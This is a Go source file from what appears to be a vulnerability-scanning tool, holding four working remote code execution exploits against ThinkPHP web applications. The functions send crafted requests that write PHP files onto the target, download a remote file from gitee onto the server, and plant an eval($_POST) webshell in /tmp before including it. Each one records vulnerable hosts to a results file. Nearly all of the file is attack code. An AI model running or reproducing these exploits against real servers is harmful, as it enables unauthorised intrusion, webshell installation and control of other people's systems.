package mm

import (
	"io/ioutil"
	"log"
	"net/http"
	"strings"

	"github.com/helenNo1/xueyi/poc/base"
	"github.com/helenNo1/xueyi/util"
)

type TpRce struct {
	base.Poc
}

var client *http.Client
var proxyStr string

func (p *TpRce) Run() {
	proxyStr = util.ProxyStr
	client = util.GetHttpClient(proxyStr, 10)
	// rce1(p.Url)
	// rce3(p.Url)
	rce5(p.Url)
	// rce6(p.Url)
}

func rce1(url string) {

	urlTmp := url +
		"/index.php?s=index/\\think/template/driver/file/write?cacheFile=11.php&content=11php"
	req, err := http.NewRequest("GET", urlTmp, nil)
	if err != nil {
		return
	}
	_, err = client.Do(req)

	if err != nil {
		return
	}

	pocUrl := url + "/11.php"
	req, err = http.NewRequest("GET", pocUrl, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if strings.Index(string(body), "11php") > -1 {
		log.Println(url, "tprce1")
		util.Writeline2file(base.PocSuccFile, url+"\ttprce1")
	}
	return
}

func rce3(url string) (pocUrl string) {

	urlTmp := url + "/index.php?s=index/index/index"
	req, err := http.NewRequest("POST", urlTmp, strings.NewReader("s=1&_method=__construct&method=&filter[]=phpinfo"))

	if err != nil {

		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)

	if err != nil {

		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if strings.Index(string(body), "Build Date") > -1 {
		log.Println(url, "tprce3")
		util.Writeline2file(base.PocSuccFile, url+"\ttprce3")
	}
	return
}

func rce5(url string) (pocUrl string) {
	//<?php @eval($_POST['cmd']);?>
	// urlTmp := url + "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=https://gitee.com/shilezhi333/test/raw/master/7.txt&vars[1][2]=7.php"
	urlTmp := url + "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=https://gitee.com/liu21st/thinkphp/raw/6.0/README.md&vars[1][2]=5.php"
	// urlTmp := url + "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=https://gitee.com/liu21st/thinkphp/raw/6.0/LICENSE.txt&vars[1][2]=5.php"
	// log.Println(urlTmp)
	req, err := http.NewRequest("GET", urlTmp, nil)
	if err != nil {

		return
	}
	_, err = client.Do(req)

	if err != nil {
		// log.Println("clientdoerror-->" + urlTmp)
		// log.Println(err)
		return
	}

	pocUrl = url + "/5.php"
	req, err = http.NewRequest("GET", pocUrl, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if strings.Index(string(body), "ThinkPHP") > -1 {

		log.Println(url, "tprce5")
		util.Writeline2file(base.PocSuccFile, url+"\ttprce5")
	}

	return
}

func rce6(url string) (pocUrl string) {

	urlTmp := url + "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=/tmp/2333.txt&vars[1][1]=<?php@@eval($_POST[123]);?>"
	// log.Println(urlTmp)

	req, err := http.NewRequest("GET", urlTmp, nil)
	if err != nil {

		return
	}
	_, err = client.Do(req)

	if err != nil {
		// log.Println("clientdoerror-->" + urlTmp)
		// log.Println(err)
		return
	}

	urlTmp = url + "/index.php?s=captcha"
	req, err = http.NewRequest(
		"POST", urlTmp, strings.
			NewReader("_method=__construct&method=get&filter[]=think\\__include_file&server[]=phpinfo&get[]=/tmp/2333.txt&123=phpinfo();"))

	if err != nil {

		return
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)

	if err != nil {
		// log.Println("clientdoerror-->" + urlTmp)
		return
	}

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return
	}
	defer resp.Body.Close()
	if strings.Index(string(body), "Build Date") > -1 {
		log.Println(url, "tprce6")
		util.Writeline2file(base.PocSuccFile, url+"\ttprce6")
	}
	return
}
